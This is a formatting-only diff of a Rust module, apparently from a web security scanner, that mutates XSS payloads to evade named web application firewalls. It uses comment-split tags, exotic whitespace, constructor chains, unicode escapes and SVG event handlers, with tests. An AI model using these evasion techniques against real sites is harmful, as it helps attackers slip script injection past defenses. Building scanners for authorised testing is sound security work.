@@ -243,7 +243,9 @@ pub fn merge_strategies(waf_types: &[&WafType]) -> BypassStrategy {
         }
 
         // Take the max delay hint
-        combined.extra_delay_hint_ms = combined.extra_delay_hint_ms.max(strategy.extra_delay_hint_ms);
+        combined.extra_delay_hint_ms = combined
+            .extra_delay_hint_ms
+            .max(strategy.extra_delay_hint_ms);
     }
 
     combined
@@ -259,7 +261,8 @@ pub fn apply_mutations(
     mutations: &[MutationType],
     max_variants_per_payload: usize,
 ) -> Vec<String> {
-    let mut out = Vec::with_capacity(payloads.len() * (1 + max_variants_per_payload.min(mutations.len())));
+    let mut out =
+        Vec::with_capacity(payloads.len() * (1 + max_variants_per_payload.min(mutations.len())));
     let mut seen = std::collections::HashSet::with_capacity(out.capacity());
 
     for payload in payloads {
@@ -323,87 +326,108 @@ fn try_first_replace(payload: &str, patterns: &[(&str, &str)]) -> String {
 /// Insert HTML comments in the middle of common HTML tag names.
 /// `<script>` → `<scr<!---->ipt>`, `<img` → `<im<!---->g`
 fn html_comment_split(payload: &str) -> String {
-    try_first_replace(payload, &[
-        ("<script", "<scr<!---->ipt"),
-        ("<SCRIPT", "<SCR<!---->IPT"),
-        ("<Script", "<Scr<!---->ipt"),
-        ("</script", "</scr<!---->ipt"),
-        ("</SCRIPT", "</SCR<!---->IPT"),
-        ("<img", "<im<!---->g"),
-        ("<IMG", "<IM<!---->G"),
-        ("<svg", "<sv<!---->g"),
-        ("<SVG", "<SV<!---->G"),
-        ("<iframe", "<ifr<!---->ame"),
-        ("<IFRAME", "<IFR<!---->AME"),
-    ])
+    try_first_replace(
+        payload,
+        &[
+            ("<script", "<scr<!---->ipt"),
+            ("<SCRIPT", "<SCR<!---->IPT"),
+            ("<Script", "<Scr<!---->ipt"),
+            ("</script", "</scr<!---->ipt"),
+            ("</SCRIPT", "</SCR<!---->IPT"),
+            ("<img", "<im<!---->g"),
+            ("<IMG", "<IM<!---->G"),
+            ("<svg", "<sv<!---->g"),
+            ("<SVG", "<SV<!---->G"),
+            ("<iframe", "<ifr<!---->ame"),
+            ("<IFRAME", "<IFR<!---->AME"),
+        ],
+    )
 }
 
 /// Insert tabs/newlines/carriage returns between HTML tags and their attributes.
 /// `<img src=x` → `<img\tsrc=x`
 fn whitespace_mutation(payload: &str) -> String {
-    try_first_replace(payload, &[
-        ("<img src", "<img\tsrc"),
-        ("<IMG src", "<IMG\tsrc"),
-        ("<IMG SRC", "<IMG\tSRC"),
-        ("<svg onload", "<svg\nonload"),
-        ("<SVG ONLOAD", "<SVG\nONLOAD"),
-        ("<SVG onload", "<SVG\nonload"),
-        ("<sVg onload", "<sVg\nonload"),
-        ("<svg/onload", "<svg\tonload"),
-        ("<body onload", "<body\nonload"),
-        ("<input onfocus", "<input\tonfocus"),
-        ("<details open", "<details\ropen"),
-        ("<marquee onstart", "<marquee\tonstart"),
-        ("<video src", "<video\tsrc"),
-        ("<audio src", "<audio\rsrc"),
-    ])
+    try_first_replace(
+        payload,
+        &[
+            ("<img src", "<img\tsrc"),
+            ("<IMG src", "<IMG\tsrc"),
+            ("<IMG SRC", "<IMG\tSRC"),
+            ("<svg onload", "<svg\nonload"),
+            ("<SVG ONLOAD", "<SVG\nONLOAD"),
+            ("<SVG onload", "<SVG\nonload"),
+            ("<sVg onload", "<sVg\nonload"),
+            ("<svg/onload", "<svg\tonload"),
+            ("<body onload", "<body\nonload"),
+            ("<input onfocus", "<input\tonfocus"),
+            ("<details open", "<details\ropen"),
+            ("<marquee onstart", "<marquee\tonstart"),
+            ("<video src", "<video\tsrc"),
+            ("<audio src", "<audio\rsrc"),
+        ],
+    )
 }
 
 /// Split JavaScript function names with comments.
 /// `alert(1)` → `al/**/ert(1)`
 fn js_comment_split(payload: &str) -> String {
-    try_first_replace(payload, &[
-        ("alert(", "al/**/ert("),
-        ("confirm(", "con/**/firm("),
-        ("prompt(", "pro/**/mpt("),
-        ("eval(", "ev/**/al("),
-        ("alert`", "al/**/ert`"),
-    ])
+    try_first_replace(
+        payload,
+        &[
+            ("alert(", "al/**/ert("),
+            ("confirm(", "con/**/firm("),
+            ("prompt(", "pro/**/mpt("),
+            ("eval(", "ev/**/al("),
+            ("alert`", "al/**/ert`"),
+        ],
+    )
 }
 
 /// Replace function call parentheses with backtick template literals.
 /// `alert(1)` → `` alert`1` ``
 fn backtick_parens(payload: &str) -> String {
-    try_first_replace(payload, &[
-        ("alert(1)", "alert`1`"),
-        ("alert(document.domain)", "alert`${document.domain}`"),
-        ("alert(document.cookie)", "alert`${document.cookie}`"),
-        ("confirm(1)", "confirm`1`"),
-        ("prompt(1)", "prompt`1`"),
-    ])
+    try_first_replace(
+        payload,
+        &[
+            ("alert(1)", "alert`1`"),
+            ("alert(document.domain)", "alert`${document.domain}`"),
+            ("alert(document.cookie)", "alert`${document.cookie}`"),
+            ("confirm(1)", "confirm`1`"),
+            ("prompt(1)", "prompt`1`"),
+        ],
+    )
 }
 
 /// Replace alert() calls with constructor chain to avoid keyword detection.
 /// `alert(1)` → `[].constructor.constructor('alert(1)')()`
 fn constructor_chain(payload: &str) -> String {
-    try_first_replace(payload, &[
-        ("alert(1)", "[].constructor.constructor('alert(1)')()"),
-        ("alert(document.domain)", "[].constructor.constructor('alert(document.domain)')()"),
-        ("confirm(1)", "[].constructor.constructor('confirm(1)')()"),
-        ("prompt(1)", "[].constructor.constructor('prompt(1)')()"),
-    ])
+    try_first_replace(
+        payload,
+        &[
+            ("alert(1)", "[].constructor.constructor('alert(1)')()"),
+            (
+                "alert(document.domain)",
+                "[].constructor.constructor('alert(document.domain)')()",
+            ),
+            ("confirm(1)", "[].constructor.constructor('confirm(1)')()"),
+            ("prompt(1)", "[].constructor.constructor('prompt(1)')()"),
+        ],
+    )
 }
 
 /// Replace first chars of JS function names with unicode escapes.
 /// `alert` → `\u0061lert`
 fn unicode_js_escape(payload: &str) -> String {
-    try_first_replace(payload, &[
-        ("alert", "\\u0061lert"),
-        ("confirm", "\\u0063onfirm"),
-        ("prompt", "\\u0070rompt"),
-        ("eval", "\\u0065val"),
-        ("document", "\\u0064ocument"),
-    ])
+    try_first_replace(
+        payload,
+        &[
+            ("alert", "\\u0061lert"),
+            ("confirm", "\\u0063onfirm"),
+            ("prompt", "\\u0070rompt"),
+            ("eval", "\\u0065val"),
+            ("document", "\\u0064ocument"),
+        ],
+    )
 }
 
 /// Encode angle brackets with mixed decimal and hex HTML entities.
@@ -457,20 +481,23 @@ fn mixed_html_entities(payload: &str) -> String {
 /// `<svg onload=alert(1)>` → `<svg/onload=alert(1)>`
 /// `<img src=x onerror=alert(1)>` → `<img/src=x onerror=alert(1)>`
 fn slash_separator(payload: &str) -> String {
-    try_first_replace(payload, &[
-        ("<svg onload", "<svg/onload"),
-        ("<SVG ONLOAD", "<SVG/ONLOAD"),
-        ("<SVG onload", "<SVG/onload"),
-        ("<img src", "<img/src"),
-        ("<IMG SRC", "<IMG/SRC"),
-        ("<IMG src", "<IMG/src"),
-        ("<details open", "<details/open"),
-        ("<input onfocus", "<input/onfocus"),
-        ("<body onload", "<body/onload"),
-        ("<marquee onstart", "<marquee/onstart"),
-        ("<video src", "<video/src"),
-        ("<audio src", "<audio/src"),
-    ])
+    try_first_replace(
+        payload,
+        &[
+            ("<svg onload", "<svg/onload"),
+            ("<SVG ONLOAD", "<SVG/ONLOAD"),
+            ("<SVG onload", "<SVG/onload"),
+            ("<img src", "<img/src"),
+            ("<IMG SRC", "<IMG/SRC"),
+            ("<IMG src", "<IMG/src"),
+            ("<details open", "<details/open"),
+            ("<input onfocus", "<input/onfocus"),
+            ("<body onload", "<body/onload"),
+            ("<marquee onstart", "<marquee/onstart"),
+            ("<video src", "<video/src"),
+            ("<audio src", "<audio/src"),
+        ],
+    )
 }
 
 /// Replace parentheses with HTML entities to bypass JS function call detection.
@@ -508,14 +535,9 @@ fn svg_animate_exec(payload: &str) -> String {
         for prefix in &["onerror=", "ONERROR="] {
             if let Some(idx) = payload.find(prefix) {
                 let after = &payload[idx + prefix.len()..];
-                let handler_end = after
-                    .find([' ', '>', '\t', '\n'])
-                    .unwrap_or(after.len());
+                let handler_end = after.find([' ', '>', '\t', '\n']).unwrap_or(after.len());
                 let handler = &after[..handler_end];
-                return format!(
-                    "<svg><animate onbegin={} attributeName=x dur=1s>",
-                    handler
-                );
+                return format!("<svg><animate onbegin={} attributeName=x dur=1s>", handler);
             }
         }
     }
@@ -528,16 +550,16 @@ fn exotic_whitespace(payload: &str) -> String {
     // Patterns: (from, tag, exotic_char, attr)
     // Using VT=\x0B and FF=\x0C between tag and attributes
     const PATTERNS: &[(&str, &str, char, &str)] = &[
-        ("<img src",        "<img",     '\x0B', "src"),
-        ("<IMG src",        "<IMG",     '\x0B', "src"),
-        ("<IMG SRC",        "<IMG",     '\x0B', "SRC"),
-        ("<svg onload",     "<svg",     '\x0C', "onload"),
-        ("<SVG ONLOAD",     "<SVG",     '\x0C', "ONLOAD"),
-        ("<svg/onload",     "<svg",     '\x0B', "onload"),
-        ("<body onload",    "<body",    '\x0C', "onload"),
-        ("<input onfocus",  "<input",   '\x0B', "onfocus"),
-        ("<details open",   "<details", '\x0C', "open"),
-        ("<marquee onstart","<marquee", '\x0B', "onstart"),
+        ("<img src", "<img", '\x0B', "src"),
+        ("<IMG src", "<IMG", '\x0B', "src"),
+        ("<IMG SRC", "<IMG", '\x0B', "SRC"),
+        ("<svg onload", "<svg", '\x0C', "onload"),
+        ("<SVG ONLOAD", "<SVG", '\x0C', "ONLOAD"),
+        ("<svg/onload", "<svg", '\x0B', "onload"),
+        ("<body onload", "<body", '\x0C', "onload"),
+        ("<input onfocus", "<input", '\x0B', "onfocus"),
+        ("<details open", "<details", '\x0C', "open"),
+        ("<marquee onstart", "<marquee", '\x0B', "onstart"),
     ];
 
     for &(from, tag, ws, attr) in PATTERNS {
@@ -700,17 +722,34 @@ mod tests {
     #[test]
     fn test_every_waf_has_strategy() {
         let waf_types = vec![
-            WafType::Cloudflare, WafType::AwsWaf, WafType::Akamai,
-            WafType::Imperva, WafType::ModSecurity, WafType::OwaspCrs,
-            WafType::Sucuri, WafType::F5BigIp, WafType::Barracuda,
-            WafType::FortiWeb, WafType::AzureWaf, WafType::CloudArmor,
-            WafType::Fastly, WafType::Wordfence,
+            WafType::Cloudflare,
+            WafType::AwsWaf,
+            WafType::Akamai,
+            WafType::Imperva,
+            WafType::ModSecurity,
+            WafType::OwaspCrs,
+            WafType::Sucuri,
+            WafType::F5BigIp,
+            WafType::Barracuda,
+            WafType::FortiWeb,
+            WafType::AzureWaf,
+            WafType::CloudArmor,
+            WafType::Fastly,
+            WafType::Wordfence,
             WafType::Unknown("test".to_string()),
         ];
         for waf in &waf_types {
             let strategy = get_bypass_strategy(waf);
-            assert!(!strategy.extra_encoders.is_empty(), "WAF {:?} has no extra encoders", waf);
-            assert!(!strategy.mutations.is_empty(), "WAF {:?} has no mutations", waf);
+            assert!(
+                !strategy.extra_encoders.is_empty(),
+                "WAF {:?} has no extra encoders",
+                waf
+            );
+            assert!(
+                !strategy.mutations.is_empty(),
+                "WAF {:?} has no mutations",
+                waf
+            );
         }
     }
 
@@ -741,10 +780,7 @@ mod tests {
 
     #[test]
     fn test_html_entity_parens() {
-        assert_eq!(
-            html_entity_parens("alert(1)"),
-            "alert&#40;1&#41;"
-        );
+        assert_eq!(html_entity_parens("alert(1)"), "alert&#40;1&#41;");
         assert_eq!(
             html_entity_parens("<img src=x onerror=alert(1)>"),
             "<img src=x onerror=alert&#40;1&#41;>"
